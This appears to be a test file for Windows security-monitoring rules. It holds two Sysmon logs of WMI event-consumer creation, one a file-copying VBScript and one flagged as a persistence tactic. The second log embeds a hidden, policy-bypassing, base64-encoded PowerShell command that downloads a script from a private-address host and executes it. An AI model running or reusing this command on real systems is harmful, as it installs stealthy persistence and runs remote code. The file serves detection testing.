[WmiConsumerEvent created, possible persistence tactic]
log 1 pass = { "win": { "eventdata": { "utcTime": "2021-11-08 09:51:02.142", "name": " \\\"StagingLocation_Example\\\"", "destination": " \\\" \\\\nOption Explicit \\\\nDim strDate,strTime,strWmiPath,strWmiResultsPath,strFilePath,strFileTarget,strComputerName \\\\nDim objWmiResultsFile,objFilePath,objSysInfo \\\\nDim objFSO,dateTime \\\\nSet dateTime = CreateObject(\\\\\\\"WbemScripting.SWbemDateTime\\\\\\\")     \\\\ndateTime.SetVarDate (now()) \\\\nstrDate = YEAR(dateTime.GetVarDate (false)) &amp; \\\\\\\"-\\\\\\\" &amp; Right(String(2,\\\\\\\"0\\\\\\\") &amp; Month(dateTime.GetVarDate (false)), 2) &amp; \\\\\\\"-\\\\\\\" &amp; Right(String(2, \\\\\\\"0\\\\\\\") &amp; DAY(dateTime.GetVarDate (false)), 2) \\\\nstrTime = FormatDateTime(dateTime.GetVarDate (false),vbShortTime) \\\\nSet objSysInfo = CreateObject(\\\\\\\"WinNTSystemInfo\\\\\\\") \\\\nstrComputerName = objSysInfo.ComputerName \\\\nstrWMIPath = \\\\\\\"&lt;ADD PATH with trailing \\\\\\\\ &gt;\\\\\\\" \\\\nstrWmiResultsPath = strWMIPath &amp; \\\\\\\"results.log\\\\\\\" \\\\nstrFilePath = TargetEvent.TargetInstance.Name \\\\nSet objFSO = CreateObject(\\\\\\\"Scripting.Filesystemobject\\\\\\\") \\\\nSet objWmiResultsFile = objFSO.OpenTextFile(strWmiResultsPath,8,True,0) \\\\nobjWmiResultsFile.WriteLine strDate &amp; \\\\\\\"T\\\\\\\" &amp; strTime &amp; \\\\\\\"Z|\\\\\\\" &amp; strComputerName &amp; \\\\\\\"|Staging Location activity|\\\\\\\"&amp; strFilePath \\\\nobjWmiResultsFile.Close \\\\nSet objFilePath = objFSO.GetFile(strFilePath) \\\\nstrFileTarget = strWmiPath &amp; strDate &amp; \\\\\\\"\\\\\\\\\\\\\\\" &amp; objFSO.GetFileName(objFilePath) \\\\nIf(Not objFSO.FolderExists(strWmiPath &amp; strDate)) Then \\\\n    objFSO.CreateFolder(strWmiPath &amp; strDate) \\\\nEnd If \\\\nobjFSO.CopyFile strFilePath, strFileTarget \\\\n\\\"", "ruleName": "technique_id=T1047,technique_name=Windows Management Instrumentation", "eventType": "WmiConsumerEvent", "type": "Script", "operation": "Created", "user": "DC\\\\Administrator" }, "system": { "eventID": "20", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"WmiEventConsumer activity detected:\r\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\r\nEventType: WmiConsumerEvent\r\nUtcTime: 2021-11-08 09:51:02.142\r\nOperation: Created\r\nUser: DC\\Administrator\r\nName:  \"StagingLocation_Example\"\r\nType: Script\r\nDestination:  \"\r\\nOption Explicit\r\\nDim strDate,strTime,strWmiPath,strWmiResultsPath,strFilePath,strFileTarget,strComputerName\r\\nDim objWmiResultsFile,objFilePath,objSysInfo\r\\nDim objFSO,dateTime\r\\nSet dateTime = CreateObject(\\\"WbemScripting.SWbemDateTime\\\")    \r\\ndateTime.SetVarDate (now())\r\\nstrDate = YEAR(dateTime.GetVarDate (false)) & \\\"-\\\" & Right(String(2,\\\"0\\\") & Month(dateTime.GetVarDate (false)), 2) & \\\"-\\\" & Right(String(2, \\\"0\\\") & DAY(dateTime.GetVarDate (false)), 2)\r\\nstrTime = FormatDateTime(dateTime.GetVarDate (false),vbShortTime)\r\\nSet objSysInfo = CreateObject(\\\"WinNTSystemInfo\\\")\r\\nstrComputerName = objSysInfo.ComputerName\r\\nstrWMIPath = \\\"<ADD PATH with trailing \\\\ >\\\"\r\\nstrWmiResultsPath = strWMIPath & \\\"results.log\\\"\r\\nstrFilePath = TargetEvent.TargetInstance.Name\r\\nSet objFSO = CreateObject(\\\"Scripting.Filesystemobject\\\")\r\\nSet objWmiResultsFile = objFSO.OpenTextFile(strWmiResultsPath,8,True,0)\r\\nobjWmiResultsFile.WriteLine strDate & \\\"T\\\" & strTime & \\\"Z|\\\" & strComputerName & \\\"|Staging Location activity|\\\"& strFilePath\r\\nobjWmiResultsFile.Close\r\\nSet objFilePath = objFSO.GetFile(strFilePath)\r\\nstrFileTarget = strWmiPath & strDate & \\\"\\\\\\\" & objFSO.GetFileName(objFilePath)\r\\nIf(Not objFSO.FolderExists(strWmiPath & strDate)) Then\r\\n    objFSO.CreateFolder(strWmiPath & strDate)\r\\nEnd If\r\\nobjFSO.CopyFile strFilePath, strFileTarget\r\\n\"\"", "version": "3", "systemTime": "2021-11-08T09:51:02.1541136Z", "eventRecordID": "140890", "threadID": "2356", "computer": "Workstation1.dc.local", "task": "20", "processID": "2304", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 89501
alert = 12
decoder = json

[WmiConsumerEvent created, possible persistence tactic using executables]
log 1 pass = { "win": { "eventdata": { "utcTime": "2021-11-04 17:06:05.800", "name": " \\\"WindowsParentalControlMigration\\\"", "destination": " \\\"powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgA0AC8AdwBlAGIAaABwAC8AXwByAHAAJwApACkAKQA7AEkARQBYACAAJABNAFMA\\\"", "ruleName": "technique_id=T1047,technique_name=Windows Management Instrumentation", "eventType": "WmiConsumerEvent", "type": "Command Line", "operation": "Created", "user": "DC\\\\Administrator" }, "system": { "eventID": "20", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"WmiEventConsumer activity detected:\r\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\r\nEventType: WmiConsumerEvent\r\nUtcTime: 2021-11-04 17:06:05.800\r\nOperation: Created\r\nUser: DC\\Administrator\r\nName:  \"WindowsParentalControlMigration\"\r\nType: Command Line\r\nDestination:  \"powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgA0AC8AdwBlAGIAaABwAC8AXwByAHAAJwApACkAKQA7AEkARQBYACAAJABNAFMA\"\"", "version": "3", "systemTime": "2021-11-04T17:06:05.8099312Z", "eventRecordID": "132326", "threadID": "1564", "computer": "Workstation1.dc.local", "task": "20", "processID": "2228", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 89502
alert = 14
decoder = json

